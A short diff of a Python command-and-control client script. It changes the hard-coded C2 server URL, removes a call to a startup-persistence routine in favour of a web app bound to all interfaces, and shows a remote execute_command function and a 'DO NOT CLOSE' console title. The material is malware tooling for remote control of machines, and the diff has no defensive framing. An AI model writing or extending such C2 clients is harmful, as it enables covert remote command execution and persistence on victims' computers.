@@ -13,7 +13,7 @@ import base64
 # ============================================================
 # YOUR PXXL URL
 # ============================================================
-C2_URL = "https://c2lab1.pxxlspace.cv"
+C2_URL = "https://c23.pxxlspace.cv"
 CLIENT_ID = str(uuid.uuid4())[:8]
 
 # ============================================================
@@ -112,7 +112,8 @@ def execute_command(cmd):
 # MAIN
 # ============================================================
 if __name__ == '__main__':
-    add_to_startup()
+    port = int(os.environ.get('PORT', 8000))
+    app.run(host='0.0.0.0', port=port)
     
     if platform.system() == 'Windows':
         os.system(f'title CLOUD C2 CLIENT - {CLIENT_ID} - DO NOT CLOSE')
